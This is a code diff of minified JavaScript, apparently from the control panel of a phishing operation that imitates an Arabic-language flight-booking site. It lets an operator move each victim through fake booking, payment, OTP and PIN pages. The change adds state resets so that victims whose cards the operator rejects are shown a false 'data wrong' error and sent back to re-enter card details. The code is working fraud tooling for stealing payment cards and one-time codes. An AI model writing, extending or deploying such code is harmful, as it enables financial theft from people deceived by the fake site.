@@ -2472,6 +2472,12 @@
                 d(!0);
                 try {
                     let r = {},
+                        resetFlow = {
+                            cardStatus: null,
+                            otpStatus: null,
+                            pinStatus: null,
+                            cardRejectionError: null
+                        },
                         n = {
                             home: "الصفحة الرئيسية",
                             results: "نتائج البحث",
@@ -2490,25 +2496,26 @@
                         };
                     switch (t) {
                         case "home":
-                            r = redirectPayload("home-new");
+                            r = redirectPayload("home-new", resetFlow);
                             break;
                         case "results":
-                            r = redirectPayload("results");
+                            r = redirectPayload("results", resetFlow);
                             break;
                         case "seats":
-                            r = redirectPayload("seats");
+                            r = redirectPayload("seats", resetFlow);
                             break;
                         case "passengers":
-                            r = redirectPayload("passengers");
+                            r = redirectPayload("passengers", resetFlow);
                             break;
                         case "insur":
-                            r = redirectPayload("insur");
+                            r = redirectPayload("insur", resetFlow);
                             break;
                         case "compar":
-                            r = redirectPayload("compar");
+                            r = redirectPayload("compar", resetFlow);
                             break;
                         case "payment":
                             r = redirectPayload("check", {
+                                ...resetFlow,
                                 cardStatus: "pending",
                                 otpStatus: "pending"
                             });
@@ -2519,7 +2526,7 @@
                             });
                             break;
                         case "confirmation":
-                            r = redirectPayload("confirmation");
+                            r = redirectPayload("confirmation", resetFlow);
                             break;
                         case "otp":
                             r = redirectPayload("otp", {
@@ -2933,6 +2940,7 @@
                                     await s(vid, redirectPayload("check", {
                                         history: updateHistoryEntry(vhist, t, ["_t1", "card"], "rejected"),
                                         cardStatus: "rejected",
+                                        otpStatus: null,
                                         cardRejectionError: "البيانات التي ادخلتها خاطئة، يرجى التحقق"
                                     })), G.success("تم رفض البطاقة — سيعاد الزائر لصفحة الدفع")
                                 }
